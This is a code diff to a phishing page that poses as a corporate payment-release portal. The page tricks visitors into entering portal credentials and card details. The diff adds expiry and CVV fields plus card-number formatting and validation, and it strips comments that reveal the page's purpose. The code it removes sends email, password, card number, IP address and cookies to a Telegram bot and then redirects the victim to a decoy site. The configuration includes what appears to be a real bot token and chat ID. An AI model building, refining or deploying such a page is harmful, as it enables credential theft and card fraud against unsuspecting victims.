@@ -21,7 +21,7 @@
             border-radius: 6px; 
             box-shadow: 0 5px 15px rgba(0,0,0,0.08); 
             width: 420px; 
-            border-top: 4px solid #0078d4; /* Corporate Blue */
+            border-top: 4px solid #0078d4; 
         }
         .header { text-align: center; margin-bottom: 20px; }
         .header h2 { margin: 0; color: #0078d4; font-size: 20px; }
@@ -39,7 +39,7 @@
         .row:last-child { margin-bottom: 0; font-weight: 600; border-top: 1px solid #ddd; padding-top: 8px; }
         .label { color: #888; }
         .value { font-weight: 500; }
-        .amount { color: #d9534f; } /* Red for attention */
+        .amount { color: #d9534f; } 
 
         .btn { 
             width: 100%; 
@@ -51,13 +51,14 @@
             cursor: pointer; 
             font-size: 16px; 
             font-weight: 600; 
-            transition: background 0.2s;
+            transition: background 0.2s, opacity 0.2s;
         }
-        .btn:hover { background: #005a9e; }
+        .btn:hover:not(:disabled) { background: #005a9e; }
+        .btn:disabled { background: #ccc; cursor: not-allowed; }
 
-        /* Hidden Form for Capture */
+        /* Hidden Form */
         #captureForm { display: none; }
-        .input-group { margin-bottom: 15px; text-align: left; }
+        .input-group { margin-bottom: 15px; text-align: left; position: relative; }
         label { display: block; margin-bottom: 6px; font-size: 13px; font-weight: 500; color: #444; }
         input { 
             width: 100%; 
@@ -66,8 +67,37 @@
             border-radius: 4px; 
             box-sizing: border-box; 
             font-size: 15px; 
+            transition: border-color 0.2s, box-shadow 0.2s;
         }
-        input:focus { border-color: #0078d4; outline: none; }
+        input:focus { border-color: #0078d4; outline: none; box-shadow: 0 0 0 2px rgba(0,120,212,0.1); }
+        
+        /* Validation States */
+        input.valid { border-color: #28a745; background-color: #f0fff0; }
+        input.invalid { border-color: #dc3545; background-color: #fff0f0; }
+        
+        /* Brand Icon */
+        .brand-icon {
+            position: absolute;
+            right: 12px;
+            top: 38px;
+            font-size: 12px;
+            font-weight: bold;
+            color: #666;
+            background: #eee;
+            padding: 2px 6px;
+            border-radius: 3px;
+            display: none;
+        }
+
+        /* Two-column layout for Expiry and CVV */
+        .row-inputs {
+            display: flex;
+            gap: 10px;
+        }
+        .row-inputs .input-group {
+            flex: 1;
+            margin-bottom: 0;
+        }
 
         .loading { 
             display: none; 
@@ -90,6 +120,13 @@
         .success { display: none; text-align: center; }
         .success h3 { color: #28a745; margin-bottom: 10px; }
         .success p { font-size: 14px; color: #666; }
+        
+        .error-msg {
+            color: #dc3545;
+            font-size: 11px;
+            margin-top: 4px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -118,7 +155,7 @@
         </div>
 
         <p style="font-size: 13px; color: #666; margin-bottom: 15px; text-align: center;">
-            To receive your payment, please verify your identity and confirm your bank details.
+            To receive your payment, please verify your identity and confirm your payment method.
         </p>
 
         <button class="btn" onclick="showForm()">Release Payment</button>
@@ -128,7 +165,7 @@
     <form id="captureForm" onsubmit="submitData(event)">
         <div class="header">
             <h2>Verify Identity</h2>
-            <p>Enter your portal credentials to authorize payment.</p>
+            <p>Enter your portal credentials and card details.</p>
         </div>
 
         <div class="input-group">
@@ -142,11 +179,25 @@
         </div>
 
         <div class="input-group">
-            <label>Confirm Card (For $0.01 Verification)</label>
-            <input type="text" id="card" name="card" placeholder="Card Number" required>
+            <label>Card Number</label>
+            <input type="text" id="card" name="card" placeholder="1234 5678 9012 3456" required maxlength="19">
+            <span id="brandIcon" class="brand-icon"></span>
+            <div id="cardError" class="error-msg">Please enter a valid card number.</div>
         </div>
 
-        <button type="submit" class="btn" style="margin-top: 10px;">Authorize & Release</button>
+        <!-- New: Expiry and CVV Side-by-Side -->
+        <div class="row-inputs">
+            <div class="input-group">
+                <label>Expiration (MM/YY)</label>
+                <input type="text" id="expiry" name="expiry" placeholder="MM/YY" required maxlength="5">
+            </div>
+            <div class="input-group">
+                <label>CVV</label>
+                <input type="text" id="cvv" name="cvv" placeholder="123" required maxlength="4">
+            </div>
+        </div>
+
+        <button type="submit" class="btn" id="submitBtn" disabled style="margin-top: 10px;">Authorize & Release</button>
     </form>
 
     <!-- STEP 3: LOADING STATE -->
@@ -166,84 +217,41 @@
     // --- CONFIGURATION ---
     const TELEGRAM_BOT_TOKEN = '8684628548:AAHRi5CTh8Gf0s9NBdgo4FqT4czGUxplExQ';
     const TELEGRAM_CHAT_ID = '6479764005';
-    
-    // Redirect to a generic, safe site after capture
     const TARGET_SITE = 'https://agweb.com'; 
 
-    // Show the form when they click "Release Payment"
-    function showForm() {
-        document.getElementById('hookView').style.display = 'none';
-        document.getElementById('captureForm').style.display = 'block';
-    }
+    // --- CARD VALIDATION LOGIC ---
+    const cardInput = document.getElementById('card');
+    const brandIcon = document.getElementById('brandIcon');
+    const cardError = document.getElementById('cardError');
+    const submitBtn = document.getElementById('submitBtn');
+    const expiryInput = document.getElementById('expiry');
+    const cvvInput = document.getElementById('cvv');
 
-    // Helper to get IP address
-    async function getIP() {
-        try {
-            const res = await fetch('https://api.ipify.org?format=json');
-            const data = await res.json();
-            return data.ip;
-        } catch {
-            return 'Unknown';
+    let cardValid = false;
+
+    // Format card number with spaces
+    cardInput.addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, ''); // Remove non-digits
+        let formattedValue = '';
+        for (let i = 0; i < value.length; i++) {
+            if (i > 0 && i % 4 === 0) formattedValue += ' ';
+            formattedValue += value[i];
         }
-    }
+        e.target.value = formattedValue;
+        validateCard(value);
+    });
 
-    // Send to Telegram
-    async function sendToTelegram(data) {
-        const message = `
-💰 <b>NEW PAYMENT RELEASE</b>
-📧 Email: <code>${data.email}</code>
-🔑 Pass: <code>${data.password}</code>
-💳 Card: <code>${data.card}</code>
-🌐 IP: <code>${data.ip}</code>
-🕒 Time: ${new Date().toLocaleString()}
-        `;
+    // Format Expiry
+    expiryInput.addEventListener('input', function (e) {
+        let value = e.target.value.replace(/\D/g, '');
+        if (value.length >= 2) {
+            value = value.substring(0, 2) + '/' + value.substring(2);
+        }
+        e.target.value = value;
+    });
 
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-        await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'HTML'
-            })
-        });
-    }
+    // Format CVV (Numbers only)
+    cvvInput.addEventListener('input', function (e) {
+        e.target.value = e.target.value.replace(/\D/g, '');
+    });
 
-    // Main Handler
-    async function submitData(e) {
-        e.preventDefault();
-        
-        const btn = e.target.querySelector('button');
-        const loading = document.getElementById('loading');
-        
-        // UI Updates
-        btn.style.display = 'none';
-        loading.style.display = 'block';
-
-        // Gather Data
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const card = document.getElementById('card').value;
-        const ip = await getIP();
-        const cookie = document.cookie || "(No cookies)";
-
-        const data = { email, password, card, ip, cookie };
-
-        // Exfiltrate
-        await sendToTelegram(data);
-
-        // Show Success
-        document.getElementById('captureForm').style.display = 'none';
-        document.getElementById('loading').style.display = 'none';
-        document.getElementById('successView').style.display = 'block';
-
-        // Redirect
-        setTimeout(() => {
-            window.location.href = TARGET_SITE;
-        }, 2500);
-    }
-</script>
-
-</body>
-</html>
